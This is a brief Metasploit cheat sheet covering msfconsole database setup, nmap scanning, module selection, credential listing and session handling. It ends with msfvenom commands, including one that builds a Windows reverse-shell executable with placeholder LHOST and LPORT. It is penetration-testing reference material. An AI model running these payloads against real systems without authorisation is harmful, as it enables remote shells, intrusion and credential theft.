---
title: "Metasploit"
weight: 5
description: ""
---

# Metasploit

## Metasploit

```sh
# Start the database service & create and initialize the MSF database
msfdb init

# Enable the database service
sudo systemctl enable postgresql

# Verify database connectivity
db_status

# Create workspace
workspace -a target1

# Scan with nmap
db_nmap -A <TARGET1>

# List of all discovered hosts up
hosts

# Display discovered services
services
services -p 5000 # specific port

# Search all SMB auxiliary modules
search type:auxiliary smb
search apache

# Activate a module
use 5

# Get information about the currently activated module
info

# Display the options of a module
show options

# Get a list of all payloads that are compatible with the currently selected module
show payloads

# set & unset an option
set <OPTION> <VALUE>
unset <OPTION>

# Set a payload
set payload payload/linux/x64/shell_reverse_tcp

# Launch a module
run

# Show vulnerabilities that Metasploit automatically detected based on the results of the executed module
vulns

# Show valid credentials we gathered
creds

# Background session
CTRL + Z

# List all active sessions
sessions -l

# Interact with a session
sessions -i 2
```
---

## msfvenom
```sh
# List payloads
msfvenom -l payloads --platform windows --arch x64

# Create payload
msfvenom -p windows/x64/shell_reverse_tcp LHOST=<IP> LPORT=<LPORT> -f exe -o file.exe
```

{{< hint style=notes >}}
**Note**: To handle a staged payload don't use netcat. Use Metasploit’s `multi/handler` instead.
{{< /hint >}}